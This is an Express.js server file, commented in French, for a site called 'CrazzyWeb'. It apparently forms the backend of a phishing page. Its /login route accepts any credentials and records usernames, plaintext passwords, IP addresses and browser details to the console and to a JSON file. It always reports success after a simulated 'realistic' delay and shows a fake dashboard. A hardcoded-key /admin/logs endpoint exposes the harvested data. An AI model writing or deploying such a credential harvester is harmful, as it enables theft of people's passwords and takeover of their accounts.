const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();

// Configuration pour le déploiement
const PORT = process.env.PORT || 3000;
const NODE_ENV = process.env.NODE_ENV || 'development';

// Middleware pour parser les données
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Trust proxy for correct IP addresses behind reverse proxy
app.set('trust proxy', 1);

// Servir les fichiers statiques
app.use(express.static('public'));

// Route pour servir la page de connexion
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour recevoir les données de connexion
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const timestamp = new Date().toISOString();
    
    // Obtenir la vraie IP (important pour les reverse proxies)
    const clientIP = req.ip || 
                    req.connection.remoteAddress || 
                    req.socket.remoteAddress ||
                    (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                    req.headers['x-forwarded-for'] ||
                    req.headers['x-real-ip'];
    
    // Données à sauvegarder
    const loginData = {
        timestamp: timestamp,
        username: username,
        password: password,
        ip: clientIP,
        userAgent: req.get('User-Agent'),
        referer: req.get('Referer') || 'Direct',
        acceptLanguage: req.get('Accept-Language') || 'N/A'
    };
    
    // Afficher dans la console (même en production pour debug)
    console.log('=== NOUVELLE TENTATIVE DE CONNEXION ===');
    console.log(`🕐 Horodatage: ${timestamp}`);
    console.log(`👤 Utilisateur: ${username}`);
    console.log(`🔑 Mot de passe: ${password}`);
    console.log(`🌍 IP: ${clientIP}`);
    console.log(`🖥️ Navigateur: ${req.get('User-Agent')}`);
    console.log(`📍 Provenance: ${req.get('Referer') || 'Accès direct'}`);
    console.log(`🌐 Langue: ${req.get('Accept-Language') || 'N/A'}`);
    console.log('===========================================\n');
    
    // Sauvegarder dans un fichier JSON (asynchrone pour éviter les blocages)
    const logFile = 'login_attempts.json';
    
    // Lire le fichier existant de manière asynchrone
    fs.readFile(logFile, 'utf8', (err, data) => {
        let existingData = [];
        
        if (!err && data) {
            try {
                existingData = JSON.parse(data);
            } catch (parseError) {
                console.error('Erreur de parsing JSON:', parseError);
                existingData = [];
            }
        }
        
        existingData.push(loginData);
        
        // Limiter à 1000 entrées pour éviter un fichier trop volumineux
        if (existingData.length > 1000) {
            existingData = existingData.slice(-1000);
        }
        
        // Sauvegarder de manière asynchrone
        fs.writeFile(logFile, JSON.stringify(existingData, null, 2), (writeErr) => {
            if (writeErr) {
                console.error('❌ Erreur lors de la sauvegarde:', writeErr);
            } else {
                console.log(`✅ Données sauvegardées dans ${logFile}`);
            }
        });
    });
    
    // Simuler un délai de connexion réaliste
    setTimeout(() => {
        res.json({ 
            status: 'success', 
            message: 'Connexion réussie',
            redirect: '/dashboard'
        });
    }, 1000 + Math.random() * 2000); // Délai réaliste entre 1-3 secondes
});

// Route pour voir les tentatives de connexion (avec protection basique)
app.get('/admin/logs', (req, res) => {
    // Protection basique par mot de passe dans l'URL (vous pouvez améliorer cela)
    const adminKey = req.query.key;
    if (adminKey !== 'admin123') {
        return res.status(403).json({ error: 'Accès refusé' });
    }
    
    fs.readFile('login_attempts.json', 'utf8', (err, data) => {
        if (err) {
            return res.json([]);
        }
        
        try {
            const loginAttempts = JSON.parse(data);
            res.json({
                total: loginAttempts.length,
                recent: loginAttempts.slice(-50), // 50 dernières tentatives
                stats: {
                    today: loginAttempts.filter(attempt => {
                        const today = new Date().toDateString();
                        const attemptDate = new Date(attempt.timestamp).toDateString();
                        return today === attemptDate;
                    }).length
                }
            });
        } catch (parseError) {
            res.status(500).json({ error: 'Erreur de parsing des logs' });
        }
    });
});

// Route dashboard améliorée
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Tableau de bord - CrazzyWeb</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    font-family: 'Segoe UI', sans-serif; 
                    text-align: center; 
                    padding: 50px; 
                    margin: 0;
                    min-height: 100vh;
                }
                .container {
                    max-width: 600px;
                    margin: 0 auto;
                    background: rgba(255,255,255,0.1);
                    padding: 40px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                }
                h1 { font-size: 2.5em; margin-bottom: 20px; }
                .welcome { font-size: 1.2em; margin-bottom: 30px; }
                .features {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                    gap: 20px;
                    margin-top: 30px;
                }
                .feature {
                    background: rgba(255,255,255,0.1);
                    padding: 20px;
                    border-radius: 10px;
                    transition: transform 0.3s;
                }
                .feature:hover { transform: translateY(-5px); }
                .logout {
                    margin-top: 30px;
                    padding: 10px 20px;
                    background: #ff6b6b;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    text-decoration: none;
                    display: inline-block;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎉 Connexion réussie !</h1>
                <p class="welcome">Bienvenue sur votre tableau de bord CrazzyWeb</p>
                
                <div class="features">
                    <div class="feature">
                        <h3>📊 Analytics</h3>
                        <p>Suivez vos statistiques en temps réel</p>
                    </div>
                    <div class="feature">
                        <h3>💬 Messages</h3>
                        <p>Gérez vos conversations</p>
                    </div>
                    <div class="feature">
                        <h3>⚙️ Paramètres</h3>
                        <p>Personnalisez votre profil</p>
                    </div>
                </div>
                
                <a href="/" class="logout">Se déconnecter</a>
            </div>
        </body>
        </html>
    `);
});

// Route de santé pour les services de monitoring
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// Gestion des erreurs 404
app.use('*', (req, res) => {
    res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>404 - Page non trouvée</title>
            <style>
                body { 
                    background: #000; 
                    color: white; 
                    font-family: Arial, sans-serif; 
                    text-align: center; 
                    padding: 100px; 
                }
                h1 { font-size: 4em; color: #0095f6; }
                a { color: #0095f6; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>404</h1>
            <h2>Page non trouvée</h2>
            <p><a href="/">← Retour à l'accueil</a></p>
        </body>
        </html>
    `);
});

// Gestion des erreurs serveur
app.use((err, req, res, next) => {
    console.error('❌ Erreur serveur:', err.stack);
    res.status(500).json({
        error: 'Erreur interne du serveur',
        timestamp: new Date().toISOString()
    });
});

// Démarrer le serveur avec binding sur toutes les interfaces pour le cloud
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Serveur CrazzyWeb démarré !`);
    console.log(`📡 Port: ${PORT}`);
    console.log(`🌍 Environnement: ${NODE_ENV}`);
    console.log(`🔗 Local: http://localhost:${PORT}`);
    console.log(`📊 Logs: http://localhost:${PORT}/admin/logs?key=admin123`);
    console.log(`💚 Health: http://localhost:${PORT}/health`);
    console.log('⏳ En attente des connexions...\n');
});

// Gestion propre de l'arrêt du serveur
process.on('SIGINT', () => {
    console.log('\n👋 Arrêt gracieux du serveur...');
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n👋 Arrêt du serveur (SIGTERM)...');
    process.exit(0);
});